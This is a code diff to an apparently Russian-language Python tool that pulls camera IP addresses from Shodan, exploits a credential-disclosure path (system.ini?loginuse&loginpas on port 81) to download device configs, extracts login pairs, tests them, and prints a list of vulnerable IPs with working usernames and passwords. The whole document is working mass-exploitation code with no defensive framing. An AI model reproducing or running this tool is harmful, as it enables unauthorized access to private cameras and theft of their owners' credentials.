@@ -4,6 +4,10 @@ from requests import session
 from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
 
+from collections import Counter
+
+os.system('cls || clear')
+
 try:
  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
 except urllib.error.URLError:
@@ -50,7 +54,7 @@ def st():
   #os.remove(r'C:\Windows\Temp\te.config')
   input('Неправильный ключ API!\nПерезапустите программу и введите корректный API.')
   exit()
- 
+
  #ips.clear()
  for result in results['matches']:
   ips.append(format(result['ip_str']))
@@ -58,12 +62,17 @@ def st():
   #   e.write(format(result['ip_str'])+'\n')
   ka = result['location']
   locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
+ # print('Do:', len(ips))
+ # #list(set(ips))
+ # print('Posle: ', len(list(set(ips))))
+ # print(f"Одинаковые: {Counter(ips)}")
+ # print(f"Одинаковые: {Counter(list(set(ips)))}")
 
- for ip in ips:
+ for ip in list(set(ips)):
   try:
 
    print(f"Trying {Fore.CYAN + ip}")
-   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10) 
+   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
 
    with open(f'camera_{ip}.ini', 'wb') as f:
     f.write(r.content)
@@ -77,22 +86,30 @@ def st():
    else:
     num_of_vulnerable.append(ip)
     print(Fore.LIGHTGREEN_EX + 'Accessed\n')
-  except Exception as e:
-    print(f'{ip} not available.\n{e}')
+  except:
+    print(f'{ip} not available.\n')
     continue
 st()
 
-print('')
+if len(num_of_vulnerable) >= int('1'):
+  taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
+else:
+  taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 
-s = session()
+print(f'Devices checked: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
+
+if len(num_of_vulnerable) >= int('1'):
+ s = session()
 
 
-raz = 0
-with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
- #username = None
- #password = None
- #print(f'Username: {username}, password: {password}')
- for ipi in num_of_vulnerable:
+ raz = 0
+ with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
+  #username = None
+  #password = None
+  #print(f'Username: {username}, password: {password}')
+  asq = []
+
+  for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
@@ -111,10 +128,10 @@ with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
       #username = words[i]
       #password = words[i+1]
       if page.status_code == 200:
-       #user = words[i]
-       #password = words[i+1]
-       print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
+       #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
+       asq.append(f'IP: {ipi}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
        raz += 1
+       #print(asq)
        bar.next()
        break
       #raz += 1
@@ -124,6 +141,11 @@ with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
       continue
    except:
     continue
-input()
+ print('\n------------\n')
 
-#gCe3xVjxN3
+ for d in asq:
+  print(d)
+ input("\nClick Enter to exit.")
+else:
+ input("No vulnerable devices was found!\nClick Enter to exit.")
+#input()
